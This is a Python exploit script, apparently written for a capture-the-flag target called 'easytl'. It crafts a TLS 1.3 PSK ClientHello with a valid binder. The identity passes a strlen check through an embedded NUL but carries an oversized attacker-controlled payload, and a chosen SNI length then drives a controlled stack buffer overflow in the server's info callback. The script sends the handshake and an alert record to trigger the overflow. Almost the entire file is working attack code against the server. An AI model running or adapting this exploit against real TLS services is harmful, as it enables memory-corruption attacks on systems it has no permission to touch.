#!/usr/bin/env python3
"""easytl: PSK ClientHello with an OVERSIZED identity + chosen SNI length.

KEY INSIGHT (this is the bug):
  the PSK callback (0x402dbb) validates the identity with
      strlen(identity) == 0x20   &&   memcmp(identity, A, 0x20) == 0
  then does
      G970f40 = calloc(1, identity_len + 0x10);
      memcpy(G970f40, identity, identity_len);        <-- identity_len is the
      G970f48 = 0x20;                                    REAL length (rdx),
                                                         not 0x20!
  So putting a NUL at offset 32 satisfies strlen()==0x20 while letting the
  identity carry arbitrary attacker bytes of any length (up to the ClientHello
  size limit).  The info callback later does
      memcpy(stack_buf[0x50], G970f40, G970f68=strlen(SNI))   (0x40304d)
  => with a long SNI the stack overflow is now FULLY CONTROLLED.
"""
import hashlib
import hmac
import socket
import struct
import sys

IDENTITY_PREFIX = b"1401518dc5d7641ccd41593a5d812410"
HEXKEY = (b"c8ad2a35c51b87a466e22bc337696f08"
          b"07ff73500ee154ee71bee86d0b6bc358"
          b"422a0e90fca2ac1be5929a7be06fd428")


def psk():
    return hmac.new(bytes.fromhex(HEXKEY.decode()), IDENTITY_PREFIX, hashlib.sha512).digest()


def hkdf_expand(prk, info, length, h):
    t, okm, i = b"", b"", 1
    while len(okm) < length:
        t = hmac.new(prk, t + info + bytes([i]), h).digest()
        okm += t
        i += 1
    return okm[:length]


def expand_label(secret, label, context, length, h):
    full = b"tls13 " + label
    info = (struct.pack("!H", length) + bytes([len(full)]) + full +
            bytes([len(context)]) + context)
    return hkdf_expand(secret, info, length, h)


def split_ch(ch):
    body = ch[4:]
    off = 2 + 32
    off += 1 + body[off]
    cl = int.from_bytes(body[off:off + 2], "big")
    off += 2 + cl
    off += 1 + body[off]
    extl = int.from_bytes(body[off:off + 2], "big")
    return body[:off], body[off + 2:off + 2 + extl]


def rebuild(prefix, exts):
    body = prefix + struct.pack("!H", len(exts)) + exts
    return b"\x01" + len(body).to_bytes(3, "big") + body


def build(template, identity, sni, hash_name="sha384"):
    h = getattr(hashlib, hash_name)
    hlen = h().digest_size
    pskb = psk()
    prefix, exts = split_ch(template)
    kept = b""
    i = 0
    while i < len(exts):
        t = int.from_bytes(exts[i:i + 2], "big")
        l = int.from_bytes(exts[i + 2:i + 4], "big")
        if t not in (0x0029, 0x0000):        # drop old psk and old SNI
            kept += exts[i:i + 4 + l]
        i += 4 + l
    if sni:
        name = struct.pack("!H", 1 + 2 + len(sni)) + b"\x00" + \
            struct.pack("!H", len(sni)) + sni
        kept = struct.pack("!HH", 0x0000, len(name)) + name + kept
    identities = struct.pack("!H", len(identity)) + identity + struct.pack("!I", 0)

    def assemble(b):
        psk_body = (2 + len(identities)) + (2 + 1 + len(b))
        psk_ext = struct.pack("!HH", 0x0029, psk_body) + \
            struct.pack("!H", len(identities)) + identities + \
            struct.pack("!H", 1 + len(b)) + bytes([len(b)]) + b
        return rebuild(prefix, kept + psk_ext)

    ch = assemble(b"\x00" * hlen)
    trunc = ch[:len(ch) - (2 + 1 + hlen)]
    early = hmac.new(b"\x00" * hlen, pskb, h).digest()
    bk = expand_label(early, b"ext binder", h(b"").digest(), hlen, h)
    fk = expand_label(bk, b"finished", b"", hlen, h)
    return assemble(hmac.new(fk, h(trunc).digest(), h).digest())


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1443
    sni_len = int(sys.argv[3]) if len(sys.argv) > 3 else 96
    ident_len = int(sys.argv[4]) if len(sys.argv) > 4 else 0x100
    marker = bytes([0x41 + (i % 26) for i in range(0x40)])   # 'A'..'Z' cycle
    payload = marker * ((ident_len - 33) // len(marker) + 1)
    identity = IDENTITY_PREFIX + b"\x00" + payload[:ident_len - 33]
    sni = b"S" * sni_len
    tpl = open("captured_ch.bin", "rb").read()[5:]
    ch = build(tpl, identity, sni)
    print("identity len=%d (strlen<=0x20 ok), sni len=%d, CH len=%d" %
          (len(identity), sni_len, len(ch)))
    s = socket.create_connection((host, port), timeout=8)
    s.sendall(b"\x16\x03\x01" + struct.pack("!H", len(ch)) + ch)
    s.settimeout(4)
    try:
        d = s.recv(4096)
    except Exception:
        d = b""
    print("resp %d B: %s" % (len(d), d[:16].hex()))
    if len(d) > 5 and d[0] == 0x16 and d[5] == 2:
        print("=> ServerHello (handshake accepted)")
        # now trigger the info-callback overflow: raw close_notify alert record
        s.sendall(b"\x15\x03\x03\x00\x02\x01\x00")
        try:
            print("after alert:", s.recv(64)[:32].hex())
        except Exception as e:
            print("after alert: %s" % type(e).__name__)
    s.close()


if __name__ == "__main__":
    main()
